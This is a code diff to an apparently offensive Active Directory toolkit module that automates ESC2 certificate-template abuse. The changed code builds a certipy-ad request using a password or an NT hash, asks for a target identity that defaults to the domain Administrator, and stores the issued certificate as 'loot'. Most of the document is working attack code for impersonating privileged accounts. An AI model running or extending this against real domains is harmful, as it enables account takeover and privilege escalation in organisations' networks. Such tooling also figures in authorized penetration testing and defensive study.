@@ -1,11 +1,10 @@
-# modules/adcs/esc2.py
-
 import os
 from core.helpers import run_command, save_loot
 from core.colors import red, green, yellow, blue
 
-def abuse_esc2(session, template_name, save=False):
-    print(blue(f"[*] Attempting ESC2 abuse using template: {template_name}"))
+def abuse_esc2(session, template_name):
+    print(blue("[>] ESC2: Abusing certificate templates with weak EKUs that allow client authentication."))
+    print(yellow("[*] This allows an attacker to impersonate users or services by requesting a certificate for them."))
 
     cas = session.adcs_metadata.get("cas", [])
     if not cas:
@@ -21,27 +20,41 @@ def abuse_esc2(session, template_name, save=False):
     default_upn = f"Administrator@{session.domain}"
     upn = input(f"[?] Enter target UPN [default: {default_upn}]: ").strip() or default_upn
 
-    cmd = (
-        f"certipy-ad req -u {session.username} -p {session.password} -dc-ip {session.dc_ip} "
-        f"-template {template_name} -ca {ca_name} "
-        f"-out {output_file} -upn {upn}"
-    )
+    # === Support both password and NT hash
+    if session.hash:
+        auth = ["-u", f"{session.username}@{session.domain}", "-hashes", session.hash]
+    elif session.password:
+        auth = ["-u", f"{session.username}@{session.domain}", "-p", session.password]
+    else:
+        print(red("[-] No credentials provided (password or hash)."))
+        return
+
+    cmd = [
+        "certipy-ad", "req",
+        *auth,
+        "-dc-ip", session.dc_ip,
+        "-template", template_name,
+        "-ca", ca_name,
+        "-out", output_file,
+        "-upn", upn
+    ]
 
     print(blue(f"[*] Requesting certificate from CA '{ca_name}' using template '{template_name}'..."))
-    stdout, stderr = run_command(cmd)
-
-    if stderr:
-        print(yellow(f"[!] Certipy returned error:\n{stderr.strip()}"))
+    command_str = " ".join(cmd)
+    stdout, stderr = run_command(command_str)
+    print(stdout.strip() or stderr.strip())
 
     if not os.path.exists(output_file) or os.path.getsize(output_file) < 100:
         print(red("[-] Certificate request failed or file not valid."))
+        print(yellow("[!] If the attack failed, try rerunning the command or run it manually. It may be a temporary connection issue."))
+        print(yellow(f"[*] Command executed: {command_str}"))
         return
 
     with open(output_file, "rb") as f:
         cert_data = f.read()
-
-    if save:
-        save_loot(output_file, cert_data, binary=True)
+    save_loot(output_file, cert_data, binary=True)
 
     print(green(f"[+] ESC2 abuse complete. Certificate saved to loot/{output_file}"))
     print(green(f"[+] UPN used: {upn}"))
+    print(green("[+] Certificate request successful!"))
+    print(yellow(f"[*] Command executed: {command_str}"))
